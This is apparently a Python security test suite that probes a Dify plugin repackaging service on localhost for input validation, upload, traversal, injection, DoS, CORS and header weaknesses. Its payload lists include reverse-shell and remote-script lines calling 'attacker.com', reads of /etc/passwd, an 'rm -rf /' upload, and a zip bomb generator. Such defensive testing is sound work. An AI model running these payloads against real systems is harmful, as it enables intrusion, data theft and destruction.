#!/usr/bin/env python3
"""
Security Test Suite for Dify Plugin Repackaging Application
"""
import asyncio
import aiohttp
import requests
import json
import os
import zipfile
import subprocess
import tempfile
import uuid
from pathlib import Path
from typing import List, Dict, Any
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class SecurityTestRunner:
    def __init__(self, base_url: str = "http://localhost"):
        self.base_url = base_url
        self.api_base = f"{base_url}/api/v1"
        self.results = []
        self.vulnerabilities = []
    
    async def run_all_tests(self):
        """Run all security tests"""
        logger.info("Starting security test suite")
        
        test_categories = [
            ("Input Validation", self.test_input_validation),
            ("File Upload Security", self.test_file_upload_security),
            ("API Security", self.test_api_security),
            ("WebSocket Security", self.test_websocket_security),
            ("Path Traversal", self.test_path_traversal),
            ("Injection Attacks", self.test_injection_attacks),
            ("DoS Resistance", self.test_dos_resistance),
            ("Information Disclosure", self.test_information_disclosure),
            ("CORS Configuration", self.test_cors_configuration),
            ("Security Headers", self.test_security_headers),
        ]
        
        for category_name, test_func in test_categories:
            logger.info(f"\n{'='*50}")
            logger.info(f"Testing: {category_name}")
            logger.info(f"{'='*50}")
            
            try:
                await test_func()
            except Exception as e:
                logger.error(f"Test category {category_name} failed: {e}")
                self.add_vulnerability("high", category_name, f"Test execution failed: {e}")
        
        self.generate_report()
    
    async def test_input_validation(self):
        """Test input validation across all endpoints"""
        tests = [
            # XSS payloads
            {
                "name": "XSS in marketplace plugin",
                "endpoint": "/tasks",
                "method": "POST",
                "payload": {
                    "marketplace_plugin": {
                        "author": "<script>alert('XSS')</script>",
                        "name": "test",
                        "version": "1.0.0"
                    }
                },
                "expected_status": [400, 422],
                "check_response": lambda r: "<script>" not in r.text
            },
            # SQL injection attempts
            {
                "name": "SQL injection in task ID",
                "endpoint": "/tasks/' OR '1'='1",
                "method": "GET",
                "expected_status": [400, 404],
            },
            # Command injection
            {
                "name": "Command injection in platform",
                "endpoint": "/tasks",
                "method": "POST",
                "payload": {
                    "url": "http://example.com/test.difypkg",
                    "platform": "linux; cat /etc/passwd",
                    "suffix": "offline"
                },
                "expected_status": [400, 422],
            },
            # Null byte injection
            {
                "name": "Null byte in filename",
                "endpoint": "/tasks/upload",
                "method": "POST",
                "files": {
                    "file": ("test.difypkg\x00.sh", b"malicious content", "application/octet-stream")
                },
                "data": {"platform": "linux", "suffix": "offline"},
                "expected_status": [400, 422],
            },
        ]
        
        for test in tests:
            await self.run_single_test(test)
    
    async def test_file_upload_security(self):
        """Test file upload security measures"""
        
        # Test 1: File size limits
        logger.info("Testing file size limits...")
        oversized_file = b"X" * (101 * 1024 * 1024)  # 101MB
        
        async with aiohttp.ClientSession() as session:
            form = aiohttp.FormData()
            form.add_field('file', oversized_file, 
                          filename='oversized.difypkg',
                          content_type='application/octet-stream')
            form.add_field('platform', 'linux')
            
            async with session.post(f"{self.api_base}/tasks/upload", data=form) as resp:
                if resp.status != 400:
                    self.add_vulnerability(
                        "medium", 
                        "File Size Validation",
                        f"Large file upload not rejected (status: {resp.status})"
                    )
        
        # Test 2: Zip bomb protection
        logger.info("Testing zip bomb protection...")
        zip_bomb = self.create_zip_bomb()
        
        async with aiohttp.ClientSession() as session:
            form = aiohttp.FormData()
            form.add_field('file', zip_bomb,
                          filename='bomb.difypkg',
                          content_type='application/octet-stream')
            form.add_field('platform', 'linux')
            
            async with session.post(f"{self.api_base}/tasks/upload", data=form) as resp:
                # Should either reject or handle safely
                if resp.status == 200:
                    # Monitor for resource exhaustion
                    task_data = await resp.json()
                    # Check if the system handles it safely
                    logger.info(f"Zip bomb upload accepted, monitoring task: {task_data}")
        
        # Test 3: Malicious file content
        logger.info("Testing malicious file content handling...")
        malicious_files = [
            ("polyglot.difypkg", self.create_polyglot_file()),
            ("eicar.difypkg", self.get_eicar_test_file()),
            ("script.difypkg", b"#!/bin/bash\nrm -rf /\n"),
        ]
        
        for filename, content in malicious_files:
            async with aiohttp.ClientSession() as session:
                form = aiohttp.FormData()
                form.add_field('file', content,
                              filename=filename,
                              content_type='application/octet-stream')
                form.add_field('platform', 'linux')
                
                async with session.post(f"{self.api_base}/tasks/upload", data=form) as resp:
                    logger.info(f"Malicious file {filename} upload: status {resp.status}")
    
    async def test_path_traversal(self):
        """Test path traversal vulnerabilities"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        
        for payload in path_traversal_payloads:
            # Test in file upload
            async with aiohttp.ClientSession() as session:
                form = aiohttp.FormData()
                form.add_field('file', b"test content",
                              filename=f"{payload}.difypkg",
                              content_type='application/octet-stream')
                form.add_field('platform', 'linux')
                
                async with session.post(f"{self.api_base}/tasks/upload", data=form) as resp:
                    if resp.status == 200:
                        # Check if file was saved with sanitized name
                        logger.info(f"Path traversal payload accepted: {payload}")
            
            # Test in file download
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.api_base}/files/{payload}/download") as resp:
                    if resp.status == 200 and b"root:" in await resp.read():
                        self.add_vulnerability(
                            "critical",
                            "Path Traversal",
                            f"Path traversal in file download: {payload}"
                        )
    
    async def test_injection_attacks(self):
        """Test various injection attack vectors"""
        
        # Command injection tests
        command_payloads = [
            "; ls -la /",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(curl http://attacker.com/shell.sh | bash)",
            "&& cat /etc/passwd",
        ]
        
        for payload in command_payloads:
            test_data = {
                "url": "http://example.com/test.difypkg",
                "platform": payload,
                "suffix": "offline"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(f"{self.api_base}/tasks", json=test_data) as resp:
                    if resp.status == 200:
                        # Monitor for command execution
                        logger.warning(f"Command injection payload accepted: {payload}")
        
        # Header injection tests
        header_payloads = {
            "X-Forwarded-For": "127.0.0.1\r\nX-Admin: true",
            "User-Agent": "Mozilla/5.0\r\nX-Secret: leaked",
            "Referer": "http://example.com\r\nSet-Cookie: admin=true",
        }
        
        for header, payload in header_payloads.items():
            async with aiohttp.ClientSession() as session:
                headers = {header: payload}
                async with session.get(f"{self.api_base}/health", headers=headers) as resp:
                    # Check response headers for injection
                    if "X-Admin" in resp.headers or "X-Secret" in resp.headers:
                        self.add_vulnerability(
                            "high",
                            "Header Injection",
                            f"Header injection possible via {header}"
                        )
    
    async def test_dos_resistance(self):
        """Test resistance to DoS attacks"""
        
        # Test 1: Rate limiting effectiveness
        logger.info("Testing rate limiting...")
        
        async def rapid_requests():
            async with aiohttp.ClientSession() as session:
                tasks = []
                for i in range(100):
                    task = session.post(f"{self.api_base}/tasks", json={
                        "url": "http://example.com/test.difypkg"
                    })
                    tasks.append(task)
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                rate_limited = sum(1 for r in responses 
                                 if not isinstance(r, Exception) and r.status == 429)
                
                if rate_limited < 70:
                    self.add_vulnerability(
                        "medium",
                        "Rate Limiting",
                        f"Only {rate_limited}/100 requests were rate limited"
                    )
                else:
                    logger.info(f"Rate limiting effective: {rate_limited}/100 requests limited")
        
        await rapid_requests()
        
        # Test 2: Resource exhaustion
        logger.info("Testing resource exhaustion resistance...")
        
        # Large payload test
        large_payload = {
            "url": "http://example.com/test.difypkg",
            "platform": "A" * 1000000,  # 1MB string
            "suffix": "B" * 1000000
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(f"{self.api_base}/tasks", json=large_payload) as resp:
                if resp.status == 200:
                    self.add_vulnerability(
                        "medium",
                        "Resource Exhaustion",
                        "Large payloads not rejected"
                    )
    
    async def test_websocket_security(self):
        """Test WebSocket security"""
        import websockets
        
        # Test 1: Invalid task ID access
        try:
            async with websockets.connect(f"ws://localhost/ws/tasks/invalid-task-id") as ws:
                # Should be rejected or return error
                message = await asyncio.wait_for(ws.recv(), timeout=5)
                logger.info(f"WebSocket response for invalid task: {message}")
        except Exception as e:
            logger.info(f"WebSocket properly rejected invalid task: {e}")
        
        # Test 2: Message flooding
        valid_task_id = await self.create_test_task()
        
        if valid_task_id:
            try:
                async with websockets.connect(f"ws://localhost/ws/tasks/{valid_task_id}") as ws:
                    # Send many messages rapidly
                    for i in range(1000):
                        await ws.send(json.dumps({"type": "flood", "data": "X" * 10000}))
                    
                    logger.info("WebSocket accepted 1000 rapid messages")
            except Exception as e:
                logger.info(f"WebSocket connection terminated under flood: {e}")
    
    async def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        
        # Test 1: Error message information leakage
        test_endpoints = [
            ("/api/v1/tasks/../../etc/passwd", "GET"),
            ("/api/v1/files/nonexistent/download", "GET"),
            ("/api/v1/tasks", "POST", {"invalid": "data"}),
        ]
        
        for endpoint_data in test_endpoints:
            endpoint = endpoint_data[0]
            method = endpoint_data[1]
            data = endpoint_data[2] if len(endpoint_data) > 2 else None
            
            async with aiohttp.ClientSession() as session:
                if method == "GET":
                    resp = await session.get(f"{self.base_url}{endpoint}")
                else:
                    resp = await session.post(f"{self.base_url}{endpoint}", json=data)
                
                response_text = await resp.text()
                
                # Check for sensitive information in errors
                sensitive_patterns = [
                    "redis://",
                    "REDIS_URL",
                    "celery",
                    "/app/",
                    "File \"/",
                    "Traceback",
                    "password",
                    "secret",
                    "key",
                ]
                
                for pattern in sensitive_patterns:
                    if pattern.lower() in response_text.lower():
                        self.add_vulnerability(
                            "medium",
                            "Information Disclosure",
                            f"Sensitive information '{pattern}' found in error response for {endpoint}"
                        )
        
        # Test 2: Directory listing
        directory_endpoints = [
            "/temp/",
            "/scripts/",
            "/app/",
            "/.git/",
            "/backup/",
        ]
        
        for endpoint in directory_endpoints:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url}{endpoint}") as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        if "Index of" in content or "<title>Directory listing" in content:
                            self.add_vulnerability(
                                "high",
                                "Directory Listing",
                                f"Directory listing enabled for {endpoint}"
                            )
    
    async def test_cors_configuration(self):
        """Test CORS configuration for security issues"""
        
        test_origins = [
            "http://evil.com",
            "https://attacker.com",
            "null",
            "file://",
        ]
        
        for origin in test_origins:
            async with aiohttp.ClientSession() as session:
                headers = {"Origin": origin}
                async with session.get(f"{self.api_base}/health", headers=headers) as resp:
                    cors_header = resp.headers.get("Access-Control-Allow-Origin")
                    
                    if cors_header == origin or cors_header == "*":
                        self.add_vulnerability(
                            "medium",
                            "CORS Misconfiguration",
                            f"Accepts requests from untrusted origin: {origin}"
                        )
    
    async def test_security_headers(self):
        """Test for security headers"""
        
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.base_url}/") as resp:
                headers = resp.headers
                
                # Check for missing security headers
                required_headers = {
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                    "X-XSS-Protection": "1; mode=block",
                    "Strict-Transport-Security": "max-age=",
                    "Content-Security-Policy": None,  # Just check existence
                }
                
                for header, expected_values in required_headers.items():
                    if header not in headers:
                        self.add_vulnerability(
                            "low",
                            "Missing Security Headers",
                            f"Missing security header: {header}"
                        )
                    elif expected_values:
                        header_value = headers[header]
                        if isinstance(expected_values, list):
                            if not any(v in header_value for v in expected_values):
                                self.add_vulnerability(
                                    "low",
                                    "Weak Security Headers",
                                    f"Weak {header}: {header_value}"
                                )
                        elif expected_values not in header_value:
                            self.add_vulnerability(
                                "low",
                                "Weak Security Headers",
                                f"Weak {header}: {header_value}"
                            )
    
    # Helper methods
    
    async def run_single_test(self, test_config: Dict[str, Any]):
        """Run a single security test"""
        name = test_config.get("name", "Unnamed test")
        endpoint = test_config.get("endpoint", "")
        method = test_config.get("method", "GET").upper()
        payload = test_config.get("payload")
        files = test_config.get("files")
        data = test_config.get("data")
        expected_status = test_config.get("expected_status", [200])
        check_response = test_config.get("check_response", lambda r: True)
        
        logger.info(f"Running test: {name}")
        
        try:
            if method == "GET":
                response = requests.get(f"{self.api_base}{endpoint}")
            elif method == "POST":
                if files:
                    response = requests.post(f"{self.api_base}{endpoint}", files=files, data=data)
                else:
                    response = requests.post(f"{self.api_base}{endpoint}", json=payload)
            else:
                response = requests.request(method, f"{self.api_base}{endpoint}", json=payload)
            
            # Check status code
            if isinstance(expected_status, list):
                if response.status_code not in expected_status:
                    self.add_vulnerability(
                        "medium",
                        name,
                        f"Unexpected status code: {response.status_code}"
                    )
            
            # Check response content
            if not check_response(response):
                self.add_vulnerability(
                    "high",
                    name,
                    "Response validation failed"
                )
            
            self.results.append({
                "test": name,
                "status": "PASS" if response.status_code in expected_status else "FAIL",
                "response_code": response.status_code
            })
            
        except Exception as e:
            logger.error(f"Test {name} failed with exception: {e}")
            self.results.append({
                "test": name,
                "status": "ERROR",
                "error": str(e)
            })
    
    def add_vulnerability(self, severity: str, category: str, description: str):
        """Add a vulnerability to the findings"""
        vuln = {
            "severity": severity,
            "category": category,
            "description": description,
            "timestamp": datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        logger.warning(f"[{severity.upper()}] {category}: {description}")
    
    def create_zip_bomb(self) -> bytes:
        """Create a zip bomb for testing"""
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Create a file with highly compressible content
                data = b'0' * (10 * 1024 * 1024)  # 10MB of zeros
                for i in range(10):
                    zf.writestr(f'file_{i}.txt', data)
            
            with open(tmp.name, 'rb') as f:
                content = f.read()
            
            os.unlink(tmp.name)
            return content
    
    def create_polyglot_file(self) -> bytes:
        """Create a polyglot file (valid as multiple formats)"""
        # JPEG header + ZIP structure
        jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        zip_content = b'PK\x03\x04' + b'\x00' * 16 + b'test.txt' + b'malicious content'
        return jpeg_header + zip_content
    
    def get_eicar_test_file(self) -> bytes:
        """Get EICAR test file (harmless but detected by AV)"""
        return b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    
    async def create_test_task(self) -> str:
        """Create a test task and return its ID"""
        async with aiohttp.ClientSession() as session:
            test_data = {
                "url": "http://example.com/test.difypkg",
                "platform": "linux",
                "suffix": "test"
            }
            
            async with session.post(f"{self.api_base}/tasks", json=test_data) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("task_id")
        return None
    
    def generate_report(self):
        """Generate security test report"""
        report = {
            "summary": {
                "total_tests": len(self.results),
                "passed": sum(1 for r in self.results if r["status"] == "PASS"),
                "failed": sum(1 for r in self.results if r["status"] == "FAIL"),
                "errors": sum(1 for r in self.results if r["status"] == "ERROR"),
                "vulnerabilities": {
                    "critical": sum(1 for v in self.vulnerabilities if v["severity"] == "critical"),
                    "high": sum(1 for v in self.vulnerabilities if v["severity"] == "high"),
                    "medium": sum(1 for v in self.vulnerabilities if v["severity"] == "medium"),
                    "low": sum(1 for v in self.vulnerabilities if v["severity"] == "low"),
                }
            },
            "vulnerabilities": self.vulnerabilities,
            "test_results": self.results,
            "timestamp": datetime.now().isoformat()
        }
        
        # Save report
        report_path = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"\nSecurity test report saved to: {report_path}")
        logger.info(f"\nSummary:")
        logger.info(f"Total vulnerabilities: {len(self.vulnerabilities)}")
        logger.info(f"- Critical: {report['summary']['vulnerabilities']['critical']}")
        logger.info(f"- High: {report['summary']['vulnerabilities']['high']}")
        logger.info(f"- Medium: {report['summary']['vulnerabilities']['medium']}")
        logger.info(f"- Low: {report['summary']['vulnerabilities']['low']}")


if __name__ == "__main__":
    # Run security tests
    runner = SecurityTestRunner()
    asyncio.run(runner.run_all_tests())